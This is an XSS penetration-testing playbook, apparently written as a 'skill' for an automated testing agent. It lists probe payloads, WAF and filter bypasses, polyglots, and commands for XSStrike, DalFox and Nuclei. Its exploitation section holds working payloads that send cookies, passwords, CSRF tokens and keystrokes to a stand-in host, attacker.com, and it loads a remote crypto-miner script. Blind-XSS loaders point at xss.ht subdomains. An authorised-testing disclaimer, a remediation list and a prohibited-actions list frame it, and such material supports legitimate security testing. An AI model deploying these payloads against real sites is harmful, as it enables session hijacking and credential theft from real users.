# Cross-Site Scripting (XSS) — Skill Playbook

**Mitre ATT&CK ID:** T1059.007 (Command and Scripting Interpreter: JavaScript/JScript)
**OWASP Mapping:** A03:2021 – Injection (XSS)
**Severity:** High / Medium
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: xss-v2
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1059.007
owasp_mapping:
  - A03:2021-Injection
  - A07:2021-Identification and Authentication Failures
tags:
  - xss
  - cross-site-scripting
  - client-side
  - web-application
  - T1059.007
  - T1189
  - T1190
environments:
  - web
  - api
  - mobile-webview
  - electron
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Entry Point Enumeration

Identify all user-supplied input vectors that reflect in responses:

| Vector Type | Context | Risk |
|---|---|---|
| URL parameters | `?search=test` | Reflected/Stored/DOM |
| Form fields | Search, comments, profiles | Stored/Reflected |
| HTTP headers | `User-Agent`, `Referer`, `X-Forwarded-For` | Reflected (logs) |
| JSON/API responses | API error messages | Reflected |
| WebSocket messages | Real-time chat | Stored/DOM |
| File uploads | Filename, metadata | Stored |
| URL fragment | `#section` | DOM-based |
| `postMessage` | Cross-origin messaging | DOM-based |

### 1.2 XSS Context Analysis

Determine output context to craft bypass payloads:

| Context | Example | Required Payload |
|---|---|---|
| HTML body | `<div>INPUT</div>` | `<script>alert(1)</script>` |
| HTML attribute | `<input value="INPUT">` | `"><script>alert(1)</script>"` |
| JavaScript string | `var x = "INPUT";` | `";alert(1);//` |
| JavaScript event | `<img onerror="INPUT">` | `alert(1)//` |
| CSS | `<style>INPUT</style>` | `</style><script>alert(1)</script>` |
| URL attribute | `<a href="INPUT">` | `javascript:alert(1)` |
| DOM sink | `location.href = INPUT` | `javascript:alert(1)` |

### 1.3 Probe Payloads (PayloadsAllTheThings + HackTricks)

**Basic probes:**
```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
javascript:alert(1)
```

**WAF bypass probes:**
```html
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
<marquee/onstart=alert(1)>
<iframe/onload=alert(1)>
<video><source onerror=alert(1)>
<math><maction actiontype="statusline#1" xlink:href="javascript:alert(1)">XSS
<annotation-xml><math><maction actiontype="statusline#1" xlink:href="javascript:alert(1)">XSS
```

**Filter evasion (HackTricks):**
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Encoding -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>

<!-- Polyglots -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- Template literals -->
${alert(1)}
#{alert(1)}
```

**DOM-based probes:**
```javascript
// location.hash
#<img src=x onerror=alert(1)>

// document.referrer
<script>document.write('<img src=x onerror=alert(1)>')</script>

// postMessage
parent.postMessage({xss:'<img src=x onerror=alert(1)>'},'*')
```

### 1.4 Automated Detection

**XSStrike:**
```bash
xsstrike -u "https://target.com/search?q=test" --crawl --blind
xsstrike -u "https://target.com/search?q=test" --fuzzer --params "q,search,query"
```

**DalFox:**
```bash
dalfox url "https://target.com/search?q=test" --blind "https://attacker.xss.ht" --waf-evasion
dalfox file urls.txt --blind "https://attacker.xss.ht" --mining-dom --mining-dict
```

**Nuclei XSS templates:**
```bash
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/xss/ -jsonl output.jsonl
```

**XSS Hunter (Blind XSS):**
```bash
# Register at xsshunter.com, get payload
<script src=https://YOUR_SUBDOMAIN.xss.ht></script>
# Inject in all fields, check dashboard for callbacks
```

### 1.5 Manual Testing (Burp Suite - HackTricks)

1. Send request to Repeater
2. Inject probe payloads in each parameter
3. Check response for unencoded reflection
4. Use **Intruder** with XSS payload lists:
   - Payload position: `search=§test§`
   - Payload set: PortSwigger XSS cheat sheet / PayloadsAllTheThings
   - Grep match: `<script>`, `onerror=`, `onload=`, `javascript:`
5. Analyze responses for reflection context

---

## 2. Confirmation

### 2.1 Proof of Execution

**Alert/Confirm/Prompt:**
```html
<script>alert(1)</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
```

**Callback to attacker server:**
```html
<script>fetch('https://attacker.com/log?c='+document.cookie)</script>
<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">
<svg onload="navigator.sendBeacon('https://attacker.com/log',document.cookie)">
```

**DOM manipulation evidence:**
```html
<script>document.body.innerHTML+='<h1>XSS</h1>'</script>
<script>document.title='XSS'</script>
```

### 2.2 CSP Bypass Verification

Test if Content Security Policy blocks execution:
```bash
# Check CSP headers
curl -I https://target.com | grep -i content-security-policy

# Test nonce bypass
<script nonce="bypassed">alert(1)</script>

# Test strict-dynamic bypass
<script src="https://trusted-cdn.com/script.js"></script>

# Test JSONP bypass
<script src="https://api.target.com/callback?callback=alert(1)"></script>
```

---

## 3. Exploitation

### 3.1 Session Hijacking
```html
<script>
fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie))
</script>
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie))">
```

### 3.2 Credential Theft
```html
<script>
var form = document.createElement('form');
form.action = 'https://attacker.com/steal';
form.method = 'POST';
var input = document.createElement('input');
input.name = 'creds';
input.value = document.getElementById('password').value;
form.appendChild(input);
document.body.appendChild(form);
form.submit();
</script>
```

### 3.3 Keylogger
```html
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?key='+encodeURIComponent(e.key))
}
</script>
```

### 3.4 Defacement / Crypto Miner
```html
<script src="https://attacker.com/miner.js"></script>
<script>document.body.innerHTML = '<h1>Hacked</h1>'</script>
```

### 3.5 CSRF Token Theft
```html
<script>
var token = document.querySelector('meta[name="csrf-token"]').content;
fetch('https://attacker.com/steal?csrf='+token)
</script>
```

### 3.6 Self-XSS to Account Takeover (Chained)
1. Find self-XSS (requires user interaction)
2. Chain with Clickjacking / OAuth misconfiguration
3. Escalate to stored XSS via profile update

### 3.7 Blind XSS Exploitation

Inject in fields reviewed by admins:
- Support tickets
- User-agent headers
- Referer headers
- X-Forwarded-For
- Order notes
- Profile fields (name, bio)

Payload:
```html
<script src=https://YOUR_SUBDOMAIN.xss.ht></script>
```

---

## 4. Tool-Specific Guidance

### 4.1 XSStrike (Advanced)
```bash
# Basic scan
xsstrike -u "https://target.com/search?q=test"

# With POST data
xsstrike -u "https://target.com/search" --data "q=test&submit=1"

# Blind XSS with callback
xsstrike -u "https://target.com/search?q=test" --blind --callback "https://attacker.xss.ht"

# WAF evasion
xsstrike -u "https://target.com/search?q=test" --fuzzer --waf-evasion

# DOM analysis
xsstrike -u "https://target.com/search?q=test" --mining-dom
```

### 4.2 DalFox (Fast)
```bash
# Single URL
dalfox url "https://target.com/search?q=test" --blind "https://attacker.xss.ht"

# From file
dalfox file urls.txt --blind "https://attacker.xss.ht" --mining-dom --mining-dict

# With custom headers
dalfox url "https://target.com/search?q=test" -H "User-Agent: Mozilla" -H "Cookie: session=abc"

# Only specific params
dalfox url "https://target.com/search?q=test&cat=1" --param "q,cat"
```

### 4.3 Burp Suite Extensions
- **XSS Validator** - Validates reflected XSS
- **XSS Hunter** - Blind XSS platform integration
- **Retire.js** - Detects vulnerable JS libraries
- **CSP Auditor** - Analyzes CSP headers

### 4.4 Manual Payload Lists (PayloadsAllTheThings)
```bash
# Clone payloads
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
# Use PayloadsAllTheThings/XSS Injection/README.md
# Use PayloadsAllTheThings/XSS Injection/xss_payloads.txt
```

---

## 5. PoC Generation

### PoC Template

```markdown
## Cross-Site Scripting — [FINDING_ID]

**URL:** https://target.com/search?q=test
**Parameter:** q
**Type:** Reflected / Stored / DOM-based / Blind
**Context:** HTML body / Attribute / JavaScript / CSS / URL
**CSP:** None / Bypassable / Strict (specify bypass)

### Payload
```html
<script>alert(document.domain)</script>
```

### Evidence
- [Screenshot of alert]
- [Response showing unencoded reflection]
- [CSP header analysis]
- [Blind XSS callback screenshot]

### Impact
- Session hijacking: YES/NO
- Credential theft: YES/NO
- Admin panel takeover: YES/NO
- Chained vulnerabilities: Clickjacking, CSRF, OAuth

### Remediation
- Context-aware output encoding (HTML, JS, CSS, URL)
- Content Security Policy (strict, no unsafe-inline)
- HttpOnly, Secure, SameSite cookies
- Input validation (allow-list)
- Sanitization libraries (DOMPurify)

### Reproduction Steps
1. Navigate to `https://target.com/search?q=<script>alert(1)</script>`
2. Observe alert dialog with document.domain
3. For stored: Submit payload in comment/profile, revisit page
4. For DOM: Navigate to `https://target.com/page#<img src=x onerror=alert(1)>`
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Reproduction in isolated browser instance
- [ ] CSP header verified (present/bypassable)
- [ ] HttpOnly cookie protection tested
- [ ] Impact scope confirmed (self vs stored vs blind)
- [ ] No destructive actions performed
- [ ] No credentials actually stolen (simulated only)

### Prohibited Actions
- Actual session theft from real users
- Credential harvesting from real users
- Defacement of production systems
- Crypto miner deployment
- Malware delivery

---

## 7. Context-Specific Payloads

### HTML Body
```html
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### HTML Attribute (Double-quoted)
```html
"><script>alert(1)</script>
" onmouseover="alert(1)"
" autofocus onfocus=alert(1)>
"><svg onload=alert(1)>
```

### HTML Attribute (Single-quoted)
```html
'><script>alert(1)</script>
' onmouseover='alert(1)'
' autofocus onfocus=alert(1)>
'><svg onload=alert(1)>
```

### JavaScript String
```html
";alert(1);//
';alert(1);//
`;alert(1);//
${alert(1)}
#{alert(1)}
```

### JavaScript Event Handler
```html
onload=alert(1)
onerror=alert(1)
onclick=alert(1)
onmouseover=alert(1)
```

### URL Attribute
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
vbscript:alert(1)
```

### CSS Context
```html
</style><script>alert(1)</script>
<style>@import'javascript:alert(1)';</style>
<body style="background:url('javascript:alert(1)')">
```

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1059.007 | JavaScript/JScript | Primary |
| T1189 | Drive-by Compromise | Delivery via XSS |
| T1190 | Exploit Public-Facing Application | Initial access |
| T1556.002 | Password Filter | Credential theft |
| T1505.003 | Web Shell | Post-exploitation via XSS |
| T1021.001 | Remote Services | Lateral movement via stolen sessions |
| T1539 | Steal Web Session Cookie | Direct impact |

---

## 9. References

- PayloadsAllTheThings XSS: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- HackTricks XSS: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CSP Bypass: https://github.com/We5ter/CSP-Bypass
- XSStrike: https://github.com/s0md3v/XSStrike
- DalFox: https://github.com/hahwul/dalfox

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*